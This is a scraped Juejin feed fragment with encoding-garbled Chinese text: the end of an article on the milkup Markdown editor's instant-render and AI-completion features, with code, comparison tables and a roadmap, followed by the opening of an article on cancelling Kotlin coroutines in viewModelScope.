    <span class="hljs-keyword">const</span> models = <span class="hljs-keyword">await</span> <span class="hljs-title class_">AIService</span>.<span class="hljs-title function_">getModels</span>(config.<span class="hljs-property">value</span>);
    ollamaModels.<span class="hljs-property">value</span> = models;
  } <span class="hljs-keyword">catch</span> (e) {
    toast.<span class="hljs-title function_">show</span>(<span class="hljs-string">"è·å–æ¨¡å‹åˆ—è¡¨å¤±è´¥"</span>, <span class="hljs-string">"error"</span>);
  } <span class="hljs-keyword">finally</span> {
    loadingModels.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  }
}

<span class="hljs-comment">// AIService.getModels å®ç°</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">getModels</span>(<span class="hljs-attr">config</span>: <span class="hljs-title class_">AIConfig</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>[]&gt; {
  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">provider</span> === <span class="hljs-string">"ollama"</span>) {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${config.baseUrl}</span>/api/tags`</span>, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">"GET"</span>
    });
    <span class="hljs-keyword">return</span> res.<span class="hljs-property">models</span>?.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">m: <span class="hljs-built_in">any</span></span>) =&gt;</span> m.<span class="hljs-property">name</span>) || [];
  }
  <span class="hljs-keyword">return</span> [];
}
</code></pre>
<p><strong>ç”¨æˆ·ä½“éªŒï¼š</strong></p>
<ul>
<li>è‡ªåŠ¨æ£€æµ‹æœ¬åœ°å¯ç”¨æ¨¡å‹</li>
<li>ä¸‹æ‹‰é€‰æ‹©ï¼Œæ— éœ€æ‰‹åŠ¨è¾“å…¥</li>
<li>å®æ—¶åˆ·æ–°</li>
</ul>
<hr/>
<h2 data-id="heading-35">å››ã€å¯¹æ¯”åˆ†æ</h2>
<h3 data-id="heading-36">4.1 å³æ—¶æ¸²æŸ“æ¨¡å¼å¯¹æ¯”</h3>




































































<table><thead><tr><th>ç‰¹æ€§</th><th>milkup (feat-ir)</th><th>Typora</th><th>Notion</th><th>VS Code + Markdown Preview</th></tr></thead><tbody><tr><td><strong>å¼€æº</strong></td><td>âœ… æ˜¯</td><td>âŒ å¦</td><td>âŒ å¦</td><td>âœ… æ˜¯</td></tr><tr><td><strong>å³æ—¶æ¸²æŸ“</strong></td><td>âœ… æ˜¯</td><td>âœ… æ˜¯</td><td>âœ… æ˜¯</td><td>âŒ å¦ï¼ˆåˆ†æ é¢„è§ˆï¼‰</td></tr><tr><td><strong>æºç å¯è§</strong></td><td>âœ… å…‰æ ‡èšç„¦æ—¶æ˜¾ç¤º</td><td>âœ… å…‰æ ‡èšç„¦æ—¶æ˜¾ç¤º</td><td>âŒ å®Œå…¨éšè—</td><td>âœ… å§‹ç»ˆæ˜¾ç¤º</td></tr><tr><td><strong>æºç å¯ç¼–è¾‘</strong></td><td>âœ… é“¾æ¥ã€å›¾ç‰‡å¯ç›´æ¥ç¼–è¾‘</td><td>âš ï¸ éƒ¨åˆ†æ”¯æŒ</td><td>âŒ å¦</td><td>âœ… æ˜¯</td></tr><tr><td><strong>æŠ€æœ¯æ ˆ</strong></td><td>ProseMirror + Milkdown</td><td>è‡ªç ”</td><td>è‡ªç ”</td><td>CodeMirror</td></tr><tr><td><strong>æ‰©å±•æ€§</strong></td><td>âœ… æ’ä»¶åŒ–æ¶æ„</td><td>âŒ ä¸æ”¯æŒæ’ä»¶</td><td>âš ï¸ æœ‰é™çš„ API</td><td>âœ… VS Code æ’ä»¶ç”Ÿæ€</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>âœ… ä¼˜ç§€</td><td>âœ… ä¼˜ç§€</td><td>âš ï¸ å¤§æ–‡æ¡£è¾ƒæ…¢</td><td>âœ… ä¼˜ç§€</td></tr><tr><td><strong>è·¨å¹³å°</strong></td><td>âœ… Windows/Mac/Linux</td><td>âœ… Windows/Mac/Linux</td><td>âœ… Web/æ¡Œé¢/ç§»åŠ¨</td><td>âœ… Windows/Mac/Linux</td></tr></tbody></table>
<p><strong>milkup çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>å¼€æºå…è´¹</strong>ï¼šå®Œå…¨å¼€æºï¼Œå¯è‡ªç”±å®šåˆ¶</li>
<li><strong>ç°ä»£åŒ–æŠ€æœ¯æ ˆ</strong>ï¼šåŸºäº Vue 3 + TypeScript + ProseMirror</li>
<li><strong>å¯æ‰©å±•æ€§å¼º</strong>ï¼šæ’ä»¶åŒ–æ¶æ„ï¼Œæ˜“äºæ·»åŠ æ–°åŠŸèƒ½</li>
<li><strong>æºç ç¼–è¾‘èƒ½åŠ›</strong>ï¼šé“¾æ¥å’Œå›¾ç‰‡å¯ç›´æ¥ç¼–è¾‘ï¼Œæ— éœ€åˆ‡æ¢æ¨¡å¼</li>
</ul>
<p><strong>Typora çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>æˆç†Ÿç¨³å®š</strong>ï¼šç»è¿‡å¤šå¹´æ‰“ç£¨ï¼ŒåŠŸèƒ½å®Œå–„</li>
<li><strong>ç”¨æˆ·ä½“éªŒ</strong>ï¼šç»†èŠ‚æ‰“ç£¨åˆ°ä½ï¼Œäº¤äº’æµç•…</li>
</ul>
<p><strong>Notion çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>åä½œèƒ½åŠ›</strong>ï¼šå¤šäººå®æ—¶åä½œ</li>
<li><strong>æ•°æ®åº“åŠŸèƒ½</strong>ï¼šä¸ä»…æ˜¯ç¼–è¾‘å™¨ï¼Œè¿˜æ˜¯çŸ¥è¯†ç®¡ç†å·¥å…·</li>
</ul>
<h3 data-id="heading-37">4.2 AI ç»­å†™åŠŸèƒ½å¯¹æ¯”</h3>




































































<table><thead><tr><th>ç‰¹æ€§</th><th>milkup (feat-ai)</th><th>Cursor</th><th>Notion AI</th><th>GitHub Copilot</th></tr></thead><tbody><tr><td><strong>æ”¯æŒåœºæ™¯</strong></td><td>Markdown æ–‡æ¡£</td><td>ä»£ç ç¼–è¾‘</td><td>æ–‡æ¡£ç¼–è¾‘</td><td>ä»£ç ç¼–è¾‘</td></tr><tr><td><strong>å¤šæä¾›å•†</strong></td><td>âœ… OpenAI/Claude/Gemini/Ollama</td><td>âŒ ä»… OpenAI</td><td>âŒ è‡ªæœ‰æ¨¡å‹</td><td>âŒ ä»… GitHub æ¨¡å‹</td></tr><tr><td><strong>æœ¬åœ°æ¨¡å‹</strong></td><td>âœ… æ”¯æŒ Ollama</td><td>âŒ å¦</td><td>âŒ å¦</td><td>âŒ å¦</td></tr><tr><td><strong>ç»“æ„åŒ–ç†è§£</strong></td><td>âœ… ç†è§£æ ‡é¢˜å±‚çº§</td><td>âœ… ç†è§£ä»£ç ç»“æ„</td><td>âš ï¸ æœ‰é™</td><td>âœ… ç†è§£ä»£ç ä¸Šä¸‹æ–‡</td></tr><tr><td><strong>è§¦å‘æ–¹å¼</strong></td><td>è‡ªåŠ¨é˜²æŠ–è§¦å‘</td><td>è‡ªåŠ¨è§¦å‘</td><td>æ‰‹åŠ¨è§¦å‘</td><td>è‡ªåŠ¨è§¦å‘</td></tr><tr><td><strong>æ¥å—æ–¹å¼</strong></td><td>Tab é”®</td><td>Tab é”®</td><td>ç‚¹å‡»æŒ‰é’®</td><td>Tab é”®</td></tr><tr><td><strong>å¼€æº</strong></td><td>âœ… æ˜¯</td><td>âŒ å¦</td><td>âŒ å¦</td><td>âŒ å¦</td></tr><tr><td><strong>éšç§ä¿æŠ¤</strong></td><td>âœ… æ”¯æŒæœ¬åœ°æ¨¡å‹</td><td>âŒ æ•°æ®ä¸Šä¼ äº‘ç«¯</td><td>âŒ æ•°æ®ä¸Šä¼ äº‘ç«¯</td><td>âŒ æ•°æ®ä¸Šä¼ äº‘ç«¯</td></tr></tbody></table>
<p><strong>milkup çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>å¤šæä¾›å•†æ”¯æŒ</strong>ï¼šå¯è‡ªç”±é€‰æ‹© AI æœåŠ¡</li>
<li><strong>æœ¬åœ°ä¼˜å…ˆ</strong>ï¼šæ”¯æŒ Ollamaï¼Œä¿æŠ¤éšç§</li>
<li><strong>å¼€æºé€æ˜</strong>ï¼šä»£ç å…¬å¼€ï¼Œå¯å®¡è®¡</li>
<li><strong>é’ˆå¯¹ Markdown</strong>ï¼šä¸“é—¨ä¼˜åŒ–æ–‡æ¡£å†™ä½œåœºæ™¯</li>
</ul>
<p><strong>Cursor/Copilot çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>ä»£ç ä¸“ç²¾</strong>ï¼šé’ˆå¯¹ä»£ç ç¼–è¾‘ä¼˜åŒ–</li>
<li><strong>ä¸Šä¸‹æ–‡æ›´ä¸°å¯Œ</strong>ï¼šå¯ä»¥ç†è§£æ•´ä¸ªé¡¹ç›®</li>
<li><strong>æˆç†Ÿåº¦é«˜</strong>ï¼šç»è¿‡å¤§é‡ç”¨æˆ·éªŒè¯</li>
</ul>
<p><strong>Notion AI çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>å¤šåŠŸèƒ½</strong>ï¼šä¸ä»…ç»­å†™ï¼Œè¿˜æ”¯æŒæ€»ç»“ã€ç¿»è¯‘ã€æ”¹å†™ç­‰</li>
<li><strong>é›†æˆåº¦é«˜</strong>ï¼šä¸ Notion ç”Ÿæ€æ·±åº¦é›†æˆ</li>
</ul>
<hr/>
<h2 data-id="heading-38">äº”ã€æ€»ç»“ä¸å±•æœ›</h2>
<h3 data-id="heading-39">5.1 æŠ€æœ¯æ€»ç»“</h3>
<p>é€šè¿‡ feat-ir å’Œ feat-ai ä¸¤ä¸ªåˆ†æ”¯çš„å¼€å‘ï¼Œmilkup åœ¨ Markdown ç¼–è¾‘å™¨é¢†åŸŸå®ç°äº†é‡è¦çªç ´ï¼š</p>
<p><strong>å³æ—¶æ¸²æŸ“æ¨¡å¼ï¼ˆfeat-irï¼‰ï¼š</strong></p>
<ul>
<li>åŸºäº ProseMirror Decoration ç³»ç»Ÿå®ç°</li>
<li>æ™ºèƒ½æ˜¾ç¤ºæºç ï¼Œå…‰æ ‡èšç„¦æ—¶å¯è§</li>
<li>æ”¯æŒé“¾æ¥å’Œå›¾ç‰‡çš„å³æ—¶ç¼–è¾‘</li>
<li>æ€§èƒ½ä¼˜åŒ–ï¼Œå¤§æ–‡æ¡£æµç•…è¿è¡Œ</li>
</ul>
<p><strong>AI ç»­å†™åŠŸèƒ½ï¼ˆfeat-aiï¼‰ï¼š</strong></p>
<ul>
<li>æ”¯æŒ OpenAIã€Claudeã€Geminiã€Ollama ç­‰å¤šä¸ªæä¾›å•†</li>
<li>ç»“æ„åŒ–ç†è§£æ–‡æ¡£ï¼Œæå–æ ‡é¢˜å±‚çº§å’Œä¸Šä¸‹æ–‡</li>
<li>ä¼˜é›…çš„ UI é›†æˆï¼ŒåŠé€æ˜å»ºè®®ä¸å¹²æ‰°é˜…è¯»</li>
<li>é˜²æŠ–å’Œå–æ¶ˆæœºåˆ¶ï¼Œä¼˜åŒ–æ€§èƒ½å’Œæˆæœ¬</li>
</ul>
<p><strong>æŠ€æœ¯äº®ç‚¹ï¼š</strong></p>
<ol>
<li><strong>æ’ä»¶åŒ–æ¶æ„</strong>ï¼šæ˜“äºæ‰©å±•å’Œç»´æŠ¤</li>
<li><strong>ç°ä»£åŒ–æŠ€æœ¯æ ˆ</strong>ï¼šVue 3 + TypeScript + ProseMirror</li>
<li><strong>ç”¨æˆ·ä½“éªŒä¼˜å…ˆ</strong>ï¼šæµç•…çš„äº¤äº’ï¼Œä¼˜é›…çš„è§†è§‰è®¾è®¡</li>
<li><strong>å¼€æºé€æ˜</strong>ï¼šä»£ç å…¬å¼€ï¼Œç¤¾åŒºé©±åŠ¨</li>
</ol>
<h3 data-id="heading-40">5.2 æœªæ¥å±•æœ›</h3>
<p><strong>çŸ­æœŸè®¡åˆ’ï¼š</strong></p>
<ol>
<li>
<p><strong>åŠŸèƒ½å®Œå–„</strong>ï¼š</p>
<ul>
<li>æ”¯æŒæ›´å¤š Markdown å…ƒç´ çš„å³æ—¶æ¸²æŸ“ï¼ˆè¡¨æ ¼ã€å…¬å¼ï¼‰</li>
<li>AI ç»­å†™æ”¯æŒæ›´å¤šåœºæ™¯ï¼ˆä»£ç å—ã€åˆ—è¡¨ï¼‰</li>
<li>æ·»åŠ  AI æ”¹å†™ã€æ€»ç»“ç­‰åŠŸèƒ½</li>
</ul>
</li>
<li>
<p><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼š</p>
<ul>
<li>å¤§æ–‡æ¡£æ€§èƒ½ä¼˜åŒ–</li>
<li>AI è¯·æ±‚ç¼“å­˜æœºåˆ¶</li>
<li>å¢é‡æ¸²æŸ“</li>
</ul>
</li>
<li>
<p><strong>ç”¨æˆ·ä½“éªŒ</strong>ï¼š</p>
<ul>
<li>æ›´ä¸°å¯Œçš„å¿«æ·é”®</li>
<li>è‡ªå®šä¹‰ä¸»é¢˜</li>
<li>æ›´å¤šé…ç½®é€‰é¡¹</li>
</ul>
</li>
</ol>
<p><strong>é•¿æœŸæ„¿æ™¯ï¼š</strong></p>
<ol>
<li>
<p><strong>åä½œèƒ½åŠ›</strong>ï¼š</p>
<ul>
<li>å¤šäººå®æ—¶åä½œ</li>
<li>ç‰ˆæœ¬æ§åˆ¶é›†æˆ</li>
<li>è¯„è®ºå’Œæ‰¹æ³¨</li>
</ul>
</li>
<li>
<p><strong>çŸ¥è¯†ç®¡ç†</strong>ï¼š</p>
<ul>
<li>åŒå‘é“¾æ¥</li>
<li>æ ‡ç­¾ç³»ç»Ÿ</li>
<li>å…¨æ–‡æœç´¢</li>
</ul>
</li>
<li>
<p><strong>AI æ·±åº¦é›†æˆ</strong>ï¼š</p>
<ul>
<li>æ™ºèƒ½å¤§çº²ç”Ÿæˆ</li>
<li>è‡ªåŠ¨æ’ç‰ˆä¼˜åŒ–</li>
<li>å¤šè¯­è¨€ç¿»è¯‘</li>
<li>è¯­æ³•æ£€æŸ¥å’Œæ”¹è¿›å»ºè®®</li>
</ul>
</li>
<li>
<p><strong>ç”Ÿæ€å»ºè®¾</strong>ï¼š</p>
<ul>
<li>æ’ä»¶å¸‚åœº</li>
<li>ä¸»é¢˜å•†åº—</li>
<li>ç¤¾åŒºè´¡çŒ®</li>
</ul>
</li>
</ol>
<h3 data-id="heading-41">5.3 è‡´è°¢</h3>
<p>æ„Ÿè°¢æ‰€æœ‰ä¸º milkup é¡¹ç›®åšå‡ºè´¡çŒ®çš„å¼€å‘è€…å’Œç”¨æˆ·ã€‚ç‰¹åˆ«æ„Ÿè°¢ï¼š</p>
<ul>
<li><strong>Milkdown</strong> å›¢é˜Ÿï¼šæä¾›äº†ä¼˜ç§€çš„ç¼–è¾‘å™¨æ¡†æ¶</li>
<li><strong>ProseMirror</strong> ç¤¾åŒºï¼šå¼ºå¤§çš„ç¼–è¾‘å™¨å†…æ ¸</li>
<li><strong>Vue.js</strong> å›¢é˜Ÿï¼šç°ä»£åŒ–çš„å‰ç«¯æ¡†æ¶</li>
<li><strong>Anthropic</strong>ï¼šClaude Code çš„å¼€å‘æ”¯æŒ</li>
</ul>
<h3 data-id="heading-42">5.4 å‚è€ƒèµ„æº</h3>
<p><strong>é¡¹ç›®åœ°å€ï¼š</strong></p>
<ul>
<li>GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fauto-plugin%2Fmilkup" target="_blank" title="https://github.com/auto-plugin/milkup" ref="nofollow noopener noreferrer">milkup</a></li>
</ul>
<h2 data-id="heading-43">ç»“è¯­</h2>
<p>milkup çš„å¼€å‘æ˜¯ä¸€æ¬¡æœ‰è¶£çš„æŠ€æœ¯æ¢ç´¢ä¹‹æ—…ã€‚æˆ‘ä»¬ä¸ä»…å®ç°äº†ç±»ä¼¼ Typora çš„å³æ—¶æ¸²æŸ“æ¨¡å¼ï¼Œè¿˜åœ¨ AI é›†æˆæ–¹é¢èµ°åœ¨äº†å‰åˆ—ã€‚</p>
<p>ä½œä¸ºä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œmilkup çš„æˆé•¿ç¦»ä¸å¼€ç¤¾åŒºçš„æ”¯æŒã€‚æˆ‘ä»¬æ¬¢è¿ä»»ä½•å½¢å¼çš„è´¡çŒ®ï¼šä»£ç ã€æ–‡æ¡£ã€å»ºè®®ã€bug æŠ¥å‘Šã€‚è®©æˆ‘ä»¬ä¸€èµ·æ‰“é€ ä¸€ä¸ªæ›´å¥½çš„ Markdown ç¼–è¾‘å™¨ï¼</p>
<p>å¦‚æœä½ å¯¹ milkup æ„Ÿå…´è¶£ï¼Œæ¬¢è¿ï¼š</p>
<ul>
<li>â­ Star é¡¹ç›®</li>
<li>ğŸ› æäº¤ Issue</li>
<li>ğŸ”§ è´¡çŒ®ä»£ç </li>
<li>ğŸ’¬ åŠ å…¥è®¨è®º</li>
</ul>
<p>è®©æˆ‘ä»¬ä¸€èµ·æ¨åŠ¨ Markdown ç¼–è¾‘å™¨çš„å‘å±•ï¼</p>
<hr/>
<p><strong>ä½œè€…ï¼š</strong> å¾·è±å„æ–¯ &amp; Claude Code <strong>æ—¥æœŸï¼š</strong> 2026 å¹´ 2 æœˆ <strong>ç‰ˆæœ¬ï¼š</strong> v1.0</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•æ­£ç¡®å–æ¶ˆ ViewModel é‡Œçš„åç¨‹]]></title>    <link>https://juejin.cn/post/7602488187407614004</link>    <guid>https://juejin.cn/post/7602488187407614004</guid>    <pubDate>2026-02-04T00:29:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488187407614004" data-draft-id="7600225000851111971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•æ­£ç¡®å–æ¶ˆ ViewModel é‡Œçš„åç¨‹"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2026-02-04T00:29:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•æ­£ç¡®å–æ¶ˆ ViewModel é‡Œçš„åç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:29:49.000Z" title="Wed Feb 04 2026 00:29:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif;word-break:break-word;line-height:1.75;font-weight:200;font-size:16px;overflow-x:hidden;color:#666;letter-spacing:.5px}.markdown-body a{text-decoration:none;color:#0064c8;position:relative}.markdown-body a:after{content:"";position:absolute;bottom:-2px;left:0;width:100%;height:1px;background-color:rgba(0,100,200,.7);transform:scale(0);transition:all .4s ease-in-out}.markdown-body a:link:hover:after{transform:scale(1)}.markdown-body code{padding:2px 4px;font-size:.9em;font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px;background-color:rgba(0,46,70,.0431);color:#39f}.markdown-body strong{font-weight:400}.markdown-body em{color:#ff6a00}.markdown-body del,.markdown-body s{color:#bbb}.markdown-body small{font-size:.8em;color:#bbb}.markdown-body kbd{margin:0 .1em;padding:5px 8px 3px;border:1px solid #d1d5d9;border-radius:3px;box-shadow:0 1px 0 0 #e3e4e6,inset 0 0 0 2px #fff;background-color:#eee;font-weight:600;font-size:.8em;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;white-space:nowrap;color:#666}.markdown-body kbd:first-child{margin-left:0}.markdown-body kbd:last-child{margin-right:0}.markdown-body img{display:block;border:0;max-width:calc(100% - 20px);min-width:20px;min-height:20px;margin:0 10px;box-shadow:0 2px 8px 2px rgba(0,0,0,.2);transition:all .25s ease-in-out}.markdown-body img:hover{transform:translateY(-4px)}.markdown-body blockquote,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{line-height:inherit;font-size:inherit;color:inherit}.markdown-body blockquote:first-child,.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child,.markdown-body ol:first-child,.markdown-body p:first-child,.markdown-body pre:first-child,.markdown-body table:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body blockquote:last-child,.markdown-body h1:last-child,.markdown-body h2:last-child,.markdown-body h3:last-child,.markdown-body h4:last-child,.markdown-body h5:last-child,.markdown-body h6:last-child,.markdown-body ol:last-child,.markdown-body p:last-child,.markdown-body pre:last-child,.markdown-body table:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:1.6em 0 .6em;color:#333;font-weight:400;position:relative}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:-2em}.markdown-body h1{font-size:1.75em}.markdown-body h1:before{content:"#"}.markdown-body h1:first-child{margin-top:0}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.35em}.markdown-body h4{font-size:1.2em}.markdown-body h5{font-size:1.1em}.markdown-body h6{font-size:1em}.markdown-body blockquote,.markdown-body ol,.markdown-body pre,.markdown-body table,.markdown-body ul{margin:1em 0}.markdown-body p{margin:.7em 0;word-break:break-word}.markdown-body pre{padding:8px 12px;color:#666;background-color:rgba(0,46,70,.0431);border:1px solid #ebebeb;tab-size:4;white-space:pre-wrap;line-height:1.4}.markdown-body pre code{color:inherit;background-color:transparent;padding:0}.markdown-body ol,.markdown-body ul{margin:1em 0 1em 2em;padding:0;line-height:1.5!important;font-size:inherit;color:inherit}.markdown-body ol:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body ol:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body ol li,.markdown-body ul li{margin:.5em 0;list-style:inherit}.markdown-body ul{list-style:disc outside}.markdown-body ul ul{list-style-type:circle}.markdown-body ul ul ul{list-style-type:square}.markdown-body ol{list-style:decimal outside}.markdown-body ol ol{list-style-type:lower-alpha}.markdown-body ol ol ol{list-style-type:lower-roman}.markdown-body blockquote{font-size:.9em;padding:8px 20px 8px 15px;color:#666;border-left:5px solid rgba(0,100,200,.7);background-color:rgba(0,100,200,.1)}.markdown-body table{border-collapse:collapse;border-spacing:0;max-width:100%;min-width:50%;word-wrap:break-word;color:inherit}.markdown-body table thead tr{background-color:#f4f6f7}.markdown-body table td,.markdown-body table th{padding:4px 16px;font-size:.95em;text-align:left;color:inherit;border:0;min-width:72px}.markdown-body table td[align=center],.markdown-body table th[align=center]{text-align:center}.markdown-body table td[align=right],.markdown-body table th[align=right]{text-align:right}.markdown-body table th{border-bottom:2px solid #e3e4e6;color:#333;font-weight:400;white-space:nowrap}.markdown-body table td{border-bottom:1px solid #ebebeb}.markdown-body hr{margin:1.5em 0;padding:0;border:0;background:linear-gradient(90deg,rgba(0,46,70,.0431),#ebebeb 50%,rgba(0,46,70,.0431));height:1px}.markdown-body br{content:"";display:block}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9c242af436549feb356a83a5d210f54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769789&amp;x-signature=B%2B3HYeFBUGjLyg%2F2%2FyV7t5iLOLU%3D" alt="0.png" loading="lazy"/></p>
<p>æ˜¨å¤©ï¼Œæˆ‘å†™è¿‡è¿™æ ·<a href="https://juejin.cn/post/7602072652607602728" target="_blank" title="https://juejin.cn/post/7602072652607602728">ä¸€ç¯‡æ–‡ç« </a>ï¼Œé‡Œé¢è®²è¿°äº†ä¸€ä¸ªå¯èƒ½ 90% çš„å¼€å‘è€…éƒ½ç­”ä¸ä¸Šæ¥é—®é¢˜ã€‚</p>
<p>ä¸­åˆæˆ‘å’ŒåŒäº‹åƒé¥­çš„æ—¶å€™ï¼Œä»–é—®æˆ‘ï¼šç„¶åå‘¢ï¼Œä½ å°±æ°´ä¸€ç¯‡æ–‡ç« ä¸ç»™è§£å†³æ–¹æ¡ˆï¼Ÿä½ çŸ¥é“ç¨‹åºå‘˜æµè¡Œä¸€å¥ä»€ä¹ˆæ ·çš„è¯å—ï¼Ÿâ€”â€”ç•™å›¾ä¸ç•™ç§ï¼Œxxä¸‡äººxã€‚</p>
<p>OKï¼Œæ‰“ä½ï¼</p>
<p>è¿™é‡Œï¼Œæˆ‘ä»¬ä» <code>viewModelScope</code> å…¥æ‰‹ï¼Œçœ‹çœ‹è¿™ä¸ªå–æ¶ˆçš„é—®é¢˜ï¼</p>
<h2 data-id="heading-0">viewModelScope</h2>
<p>æˆ‘çŸ¥é“ï¼Œä½œä¸ºä¸€åå®‰å“å¼€å‘è€…ï¼Œéƒ½æ›¾èŠ±è´¹æ— æ•°æ—¶é—´è°ƒè¯•å„ç§è¯¡å¼‚çš„å´©æºƒé—®é¢˜å’Œå†…å­˜æ³„æ¼ï¼Œè€Œè¿™äº›é—®é¢˜çš„æ ¹æºå¾€å¾€éƒ½æŒ‡å‘åç¨‹å¤„ç†ä¸å½“ã€‚</p>
